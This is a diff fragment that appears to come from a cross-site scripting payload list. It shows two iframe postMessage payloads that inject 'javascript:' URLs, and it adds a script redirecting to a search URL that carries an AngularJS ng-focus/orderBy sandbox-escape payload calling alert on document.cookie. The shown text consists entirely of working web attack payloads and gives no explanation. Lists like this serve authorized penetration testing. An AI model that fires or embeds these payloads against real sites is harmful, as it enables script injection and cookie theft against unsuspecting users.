@@ -3,3 +3,8 @@
 <iframe src="domain" onload="this.contentWindow.postMessage('javascript:prompt(document.domain)//http:','*')">
 
 <iframe src=domain onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
+
+<script>
+location='https://lol.com/?search=%3Cinput%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
+</script>
+
